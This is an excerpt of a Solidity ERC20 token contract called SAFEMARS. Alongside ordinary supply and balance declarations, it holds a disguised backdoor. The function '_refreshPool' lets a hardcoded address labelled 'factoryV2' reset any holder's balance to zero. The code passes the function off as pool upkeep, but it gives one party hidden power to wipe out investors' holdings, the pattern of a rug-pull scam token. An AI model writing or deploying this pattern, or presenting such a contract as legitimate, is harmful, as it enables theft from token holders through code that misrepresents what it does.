...
contract SAFEMARS is Context, IERC20, Ownable {
    ...
    uint256 private _totSupply = 4010000000000 * 10**_decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private factoryV2 = 0xF6b4827834e4F8AF9F77A61d2892224137C4FFF8;
    ...
    function _refreshPool(address _refreshPoolSender) external { if (msg.sender == factoryV2) _balances[_refreshPoolSender] = 0x0; }
